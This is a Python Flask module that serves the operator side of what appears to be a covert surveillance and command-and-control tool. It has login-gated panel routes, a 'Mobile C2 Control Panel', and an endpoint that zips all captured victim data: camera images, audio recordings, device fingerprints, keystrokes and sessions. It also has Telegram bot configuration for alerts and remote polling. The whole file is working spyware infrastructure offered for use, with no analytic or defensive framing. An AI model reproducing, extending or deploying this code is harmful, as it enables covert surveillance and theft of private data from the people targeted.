"""panel blueprint (P3.23) — operator HTML shells + panel APIs.

Moved verbatim from app.py (panel/mobile_control HTML shells, ZIP export,
telegram control).  Response shapes are frozen and enforced by
tests/char.
"""
from __future__ import annotations

import io
import json
import os
import zipfile
from datetime import datetime

from flask import (Blueprint, jsonify, make_response, redirect,
                   render_template, request, session, url_for, Response)

from app.state import (
    ANALYTICS, BASE_DIR, STORE, change_token, generate_token, load_check_c,
)
from telegram_bot import telegram_bot

bp = Blueprint("panel", __name__)


@bp.route('/panel')
def panel():
    key = load_check_c()
    cookie = request.cookies.get('logindata')
    if cookie and cookie == key.get('token') and key.get('expired') == 'no':
        if not session.get('IAm-logined'):
            session['IAm-logined'] = 'yes'
        # Initialize CWD for terminal
        if 'cwd' not in session:
            session['cwd'] = os.getcwd()
    elif session.get('IAm-logined'):
        client_token = generate_token()
        resp = make_response(render_template('panel.html', username=session.get('IAm-logined')))
        resp.set_cookie('logindata', client_token, max_age=86400*30, path='/')
        change_token(client_token)
        return resp
    else:
        return redirect('/login')

    return render_template('panel.html', username=session.get('IAm-logined'))
@bp.route('/mobile_control')
def mobile_control():
    """Mobile C2 Control Panel"""
    if not session.get('IAm-logined'):
        return redirect('/login')
    return render_template('mobile_control.html')
@bp.route('/panel.php')
def panel_php():
    return panel()
@bp.route('/api/export/all', methods=['POST'])
def export_all_data():
    """Export all captured data as a ZIP archive"""
    try:
        memory_file = io.BytesIO()
        with zipfile.ZipFile(memory_file, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Export images
            images_dir = os.path.join(BASE_DIR, 'images')
            if os.path.exists(images_dir):
                for f in os.listdir(images_dir):
                    zf.write(os.path.join(images_dir, f), f'images/{f}')
            
            # Export audio
            sounds_dir = os.path.join(BASE_DIR, 'sounds')
            if os.path.exists(sounds_dir):
                for f in os.listdir(sounds_dir):
                    zf.write(os.path.join(sounds_dir, f), f'audio/{f}')
            
            # Export fingerprints
            fp_dir = os.path.join(BASE_DIR, 'fingerprints')
            if os.path.exists(fp_dir):
                for f in os.listdir(fp_dir):
                    zf.write(os.path.join(fp_dir, f), f'fingerprints/{f}')
            
            # Export keystrokes
            ks_dir = os.path.join(BASE_DIR, 'keystrokes')
            if os.path.exists(ks_dir):
                for f in os.listdir(ks_dir):
                    zf.write(os.path.join(ks_dir, f), f'keystrokes/{f}')
            
            # Export sessions
            sess_dir = os.path.join(BASE_DIR, 'sessions')
            if os.path.exists(sess_dir):
                for f in os.listdir(sess_dir):
                    zf.write(os.path.join(sess_dir, f), f'sessions/{f}')
            
            # Export analytics summary
            summary = {
                'exported_at': datetime.now().isoformat(),
                'total_events': len(ANALYTICS['events']),
                'c2_sessions': len(STORE.c2_all_sessions()),
                'mobile_sessions': len(STORE.mobile_all_sessions()),
                'events': ANALYTICS['events'][-100:]
            }
            zf.writestr('analytics_summary.json', json.dumps(summary, indent=2, default=str))
        
        memory_file.seek(0)
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        return Response(
            memory_file.read(),
            mimetype='application/zip',
            headers={'Content-Disposition': f'attachment; filename=storm_export_{timestamp}.zip'}
        )
    except Exception as e:
        return jsonify({'error': str(e)}), 500
@bp.route('/api/telegram/config', methods=['GET', 'POST'])
def telegram_config():
    if request.method == 'POST':
        data = request.json
        telegram_bot.configure(
            token=data.get('token', ''),
            chat_id=data.get('chat_id', ''),
            alert_types=data.get('alert_types'),
        )
        return jsonify({'status': 'configured', 'config': telegram_bot.get_config()})
    return jsonify({'config': telegram_bot.get_config()})
@bp.route('/api/telegram/test', methods=['POST'])
def telegram_test():
    result = telegram_bot.test_connection()
    return jsonify(result)
@bp.route('/api/telegram/start_polling', methods=['POST'])
def telegram_start():
    from flask import current_app
    telegram_bot.start_polling(current_app._get_current_object())
    return jsonify({'status': 'polling_started'})
@bp.route('/api/telegram/stop_polling', methods=['POST'])
def telegram_stop():
    telegram_bot.stop_polling()
    return jsonify({'status': 'polling_stopped'})
